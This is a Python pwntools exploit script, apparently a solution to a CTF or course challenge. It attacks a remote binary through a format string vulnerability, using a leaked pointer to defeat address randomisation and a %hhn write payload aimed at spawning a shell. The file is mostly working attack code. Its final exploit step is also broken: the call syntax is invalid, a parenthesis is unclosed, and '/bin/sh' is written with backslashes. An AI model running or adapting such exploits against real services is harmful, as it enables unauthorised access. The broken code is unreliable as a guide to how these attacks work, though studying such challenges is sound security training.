#!/usr/bin/env python3

from pwn import *

HOST = args.HOST if args.HOST else "6447.lol"
PORT = args.PORT if args.PORT else 6003

context.arch = "amd64"
context.log_level = 'info'

gdbscript = '''
continue
'''.format(**locals())

######################################
######## Establish Connection ########
######################################

def connect_binary():
    global P, E
    
    with context.local(log_level='error'):
        if args.REMOTE:
            P = remote(HOST, PORT)
        elif args.GDB:
            P = gdb.debug([f"{__file__.replace('_sol.py', '')}"], gdbscript=gdbscript)
        else:
            P = process(f"{__file__.replace('_sol.py', '')}")

    E = ELF(f"{__file__.replace('_sol.py', '')}")

def build_format_string(target, goal, offset=1, bytes_to_write=8, max_size=8):
    assert max_size % 8 == 0, "Max size must be 8-byte aligned."

    if isinstance(target, int):
        target = p64(target)
    if isinstance(goal, int):
        goal = p64(goal)

    while True:
        payload = b''
        written = 0

        for i in range(0, bytes_to_write):
            byte_to_write = goal[i]

            to_write = (byte_to_write - written) % 0x100
            written = (written + to_write) % 0x100

            if to_write > 0:
                payload += f"%{to_write}c%{offset + (max_size // 8) + i}$hhn".encode()
            else:
                payload += f"%{offset + (max_size // 8) + i}$hhn".encode()

        payload_len = len(payload)

        if payload_len > max_size:
            max_size = ((payload_len + 7) // 8) * 8
            log.info(f"Increasing format string initial input size to {max_size}")
            continue

        payload = payload.ljust(max_size, b'A')

        for i in range(0, bytes_to_write):
            payload += p64(u64(target) + i)

        return payload

# def find_offset(after = b':', option = 1):
#     connect_binary()
#     payload = b'AAAABBBB'
#     for i in range(1, 20):
#         payload += f'%8$p '.encode()
#     say(payload)
#     printer()
#     P.sendline()
        # # leak = P.recvuntil(b'!',drop=True)[14+8:]
        # # if leak == b'0x4242424241414141':
        # #     if option == 1:
        # #         return i
        # #     else:
        # #         print('{}: {}'.format(i, leak.strip().decode('utf-8')))

        # if option == 1:
        #     P.sendlineafter(after, f'AAAA%{i}$x'.encode())
        #     output = P.recvline(timeout=0.5).strip().decode('utf-8')
        # else:
        #     P.sendlineafter(after, 'AAAABBBB %{}$x'.format(i)) # replace %x with %s to find the actual values
        #     P.recvuntil('AAAABBBB ')
        #     print('{}: {}'.format(i, P.recvline(timeout=0.5).strip().decode('utf-8')))

        # with context.local(log_level='error'):
        #     P.close()

        # if option == 1 and '41414141' in output:
        #     return i

######################################
### Miscellaneous Helper Functions ###
######################################

# there is a format string vulnerability when inputting a buffer (size 256)

def runner(send):
    P.recvuntil(b'[s]alutations', drop=True)
    if(send in ['i', 'p', 's']):
        P.sendline(send.encode())

def say(payload):
    runner('i')
    P.sendline(payload)
    
def printer():
    runner('p')

######################################
############## Exploit ###############
######################################

def exploit():
    P.recvuntil(b'pointer ')
    spooky_leak = int(P.recvline()[:-1], 16)
    E.address = spooky_leak - 0x2037
    offset = 8 # from examining format string output
    build_format_string(target: p64(E.address + 0x1273), goal: b'\\bin\sh'

    P.interactive()

if __name__ == '__main__':
    connect_binary()
    exploit()
    P.close()
